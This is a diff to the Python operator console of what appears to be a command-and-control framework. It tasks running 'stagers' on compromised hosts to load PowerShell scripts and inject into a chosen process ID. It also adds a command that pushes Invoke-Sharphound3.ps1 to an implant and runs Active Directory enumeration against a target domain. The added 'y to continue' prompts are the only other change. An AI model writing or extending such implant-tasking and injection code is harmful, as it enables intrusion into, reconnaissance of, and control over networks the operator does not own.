@@ -995,6 +995,9 @@ class mymainclass():
                     #set auto compete for filename
                     setautocomplete(t_psloader.psfiles)
                     user_input_psfile = input("Please enter psfile to load: ")
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
 
                     if (user_input_psfile not in self.__t_myserver.get_psloadlist(user_input_stager)):
 
@@ -1247,6 +1250,7 @@ class mymainclass():
                         continue
                     self.__t_myserver.create_command(user_input_stager,"psreset","dummy")
                     self.__t_myserver.clean_psloadlist(user_input_stager)
+                    continue
                 
                 if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_INJECT:
                     
@@ -1273,7 +1277,36 @@ class mymainclass():
 
                     removecomplete()
                     user_input_target = input("Please enter pid to inject into: ")
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+
                     self.__t_myserver.create_command(user_input_stager,"ps","Invoke-inject \"{}\"".format(user_input_target))
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_SHARPHOUND3:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    t_psloader = ps_loader()
+                    t_result = t_psloader.load_ps("Invoke-Sharphound3.ps1")
+                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+
+                    
+                    removecomplete()
+                    user_input_domain = input("Please enter the targer domain: ")
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.SHARPHOUND3.format(user_input_domain))
+                    continue
+
 
 
 
